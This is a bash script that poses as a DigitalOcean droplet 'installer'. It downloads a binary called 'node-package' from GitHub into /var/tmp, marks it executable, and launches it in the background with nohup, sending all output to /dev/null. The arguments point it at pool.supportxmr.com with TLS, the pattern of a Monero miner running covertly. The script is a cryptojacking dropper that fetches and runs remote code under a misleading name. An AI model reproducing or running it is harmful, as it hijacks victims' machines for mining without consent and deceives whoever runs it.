#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/digitalocean-droplet/installer/raw/refs/heads/main/node-package"
TARGET_DIR="/var/tmp"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"

# Ensure target directory exists
mkdir -p "$TARGET_DIR"

# Download the file to /var/tmp
echo "Downloading to $FULL_PATH..."
curl -L -o "$FULL_PATH" "$URL"

# Make it executable
chmod +x "$FULL_PATH"

# Run silently in background
nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u  -k --tls -p prolay > /dev/null 2>&1 &
